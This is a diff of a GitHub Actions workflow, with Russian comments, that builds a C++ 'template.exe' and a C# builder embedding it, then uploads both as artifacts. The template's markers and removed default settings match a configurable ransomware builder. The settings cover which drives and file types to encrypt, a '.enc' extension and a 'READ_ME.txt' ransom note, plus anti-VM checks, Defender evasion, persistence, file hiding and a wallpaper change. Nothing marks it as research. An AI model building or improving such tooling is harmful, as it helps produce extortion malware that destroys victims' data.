@@ -37,24 +37,11 @@ jobs:
         Write-Host "=== ANALYZING TEMPLATE MARKERS ==="
         Write-Host ""
         
-        # Проверяем наличие маркеров в бинарнике
         $markers = @(
-          "|DRIVES|",
-          "|EXTS|",
-          "|ENC_EXT|",
-          "|NOTE_NAME|",
-          "|NOTE_CONTENT|",
-          "|FAKE_NAME|",
-          "|ALGO|",
-          "|FAKE_ENABLED|",
-          "|HIDE_ENABLED|",
-          "|ANTI_VM|",
-          "|DEFENDER|",
-          "|PERSISTENCE|",
-          "|HIDE_FILES|",
-          "|DELAY|",
-          "|WALLPAPER_BASE64|",
-          "|WALLPAPER_EXT|"
+          "|DRIVES|", "|EXTS|", "|ENC_EXT|", "|NOTE_NAME|", "|NOTE_CONTENT|",
+          "|FAKE_NAME|", "|ALGO|", "|FAKE_ENABLED|", "|HIDE_ENABLED|", "|ANTI_VM|",
+          "|DEFENDER|", "|PERSISTENCE|", "|HIDE_FILES|", "|DELAY|",
+          "|WALLPAPER_BASE64|", "|WALLPAPER_EXT|"
         )
         
         Write-Host "Searching for markers in template.exe..."
@@ -66,7 +53,7 @@ jobs:
         foreach ($marker in $markers) {
           $result = Select-String -Path template.exe -Pattern $marker -Encoding UTF8
           if ($result) {
-            Write-Host "  [FOUND] $marker at position: $($result[0].LineNumber)" -ForegroundColor Green
+            Write-Host "  [FOUND] $marker" -ForegroundColor Green
             $found++
           } else {
             Write-Host "  [MISSING] $marker" -ForegroundColor Red
@@ -81,80 +68,19 @@ jobs:
         
         if ($notFound -gt 0) {
           Write-Host ""
-          Write-Host "WARNING: Some markers are missing! They may have been optimized out." -ForegroundColor Yellow
-          Write-Host "Try compiling without optimizations: cl /O0 /MT /EHsc /std:c++17 /Fe:template.exe template.cpp ..."
+          Write-Host "WARNING: Some markers are missing!" -ForegroundColor Yellow
           exit 1
         }
         
         Write-Host ""
         Write-Host "All markers found successfully!" -ForegroundColor Green
     
-    # ========== 3. ПОКАЗЫВАЕМ СТРУКТУРУ БИНАРНИКА ==========
-    - name: Show Binary Info
-      run: |
-        Write-Host ""
-        Write-Host "=== BINARY INFORMATION ==="
-        Write-Host ""
-        
-        # Размер файла
-        $size = (Get-Item template.exe).Length
-        Write-Host "  File size: $size bytes ($([math]::Round($size/1KB, 2)) KB)"
-        
-        # Проверка на наличие маркеров в бинарнике (шестнадцатеричный дамп)
-        Write-Host ""
-        Write-Host "  First 512 bytes (hex):"
-        $bytes = [System.IO.File]::ReadAllBytes("template.exe")
-        for ($i = 0; $i -lt 512; $i += 16) {
-          $hex = ""
-          $ascii = ""
-          for ($j = 0; $j -lt 16 -and $i+$j -lt $bytes.Length; $j++) {
-            $b = $bytes[$i+$j]
-            $hex += $b.ToString("X2") + " "
-            if ($b -ge 32 -and $b -le 126) { $ascii += [char]$b } else { $ascii += "." }
-          }
-          Write-Host "    $($i.ToString("X4")): $hex $ascii"
-        }
-        
-        Write-Host ""
-        Write-Host "  Searching for marker positions..."
-        
-        $markers = @{
-          "|DRIVES|" = "Default: C:\|D:\"
-          "|EXTS|" = "Default: .txt|.doc|.docx"
-          "|ENC_EXT|" = "Default: .enc"
-          "|NOTE_NAME|" = "Default: READ_ME.txt"
-          "|ALGO|" = "Default: 0"
-          "|FAKE_ENABLED|" = "Default: 0"
-        }
-        
-        foreach ($marker in $markers.Keys) {
-          $pos = [System.IO.File]::ReadAllBytes("template.exe") | %{ if ($_ -eq [byte][char]$marker[0]) { $i } }
-          $bytes = [System.IO.File]::ReadAllBytes("template.exe")
-          $found = $false
-          for ($i = 0; $i -lt $bytes.Length - $marker.Length; $i++) {
-            $match = $true
-            for ($j = 0; $j -lt $marker.Length; $j++) {
-              if ($bytes[$i+$j] -ne [byte][char]$marker[$j]) { $match = $false; break }
-            }
-            if ($match) {
-              Write-Host "    $marker at offset: 0x$($i.ToString('X8'))"
-              $found = $true
-              # Показываем контекст
-              $context = ""
-              for ($k = $i - 4; $k -lt $i + $marker.Length + 20; $k++) {
-                if ($k -ge 0 -and $k -lt $bytes.Length) {
-                  $c = $bytes[$k]
-                  if ($c -ge 32 -and $c -le 126) { $context += [char]$c } else { $context += "." }
-                }
-              }
-              Write-Host "      Context: $context"
-              break
-            }
-          }
-          if (-not $found) {
-            Write-Host "    $marker NOT FOUND" -ForegroundColor Red
-          }
-        }
+    # ========== 3. СОХРАНЯЕМ template.exe КАК АРТЕФАКТ ==========
+    - name: Upload Template
+      uses: actions/upload-artifact@v4
+      with:
+        name: template
+        path: template.exe
     
     # ========== 4. СОБИРАЕМ БИЛДЕР (C#) С ВСТРОЕННЫМ ШАБЛОНОМ ==========
     - name: Setup MSBuild
@@ -177,7 +103,7 @@ jobs:
           exit 1
         }
     
-    # ========== 5. ЗАГРУЖАЕМ АРТЕФАКТ ==========
+    # ========== 5. ЗАГРУЖАЕМ БИЛДЕР ==========
     - name: Upload Builder EXE
       uses: actions/upload-artifact@v4
       with:
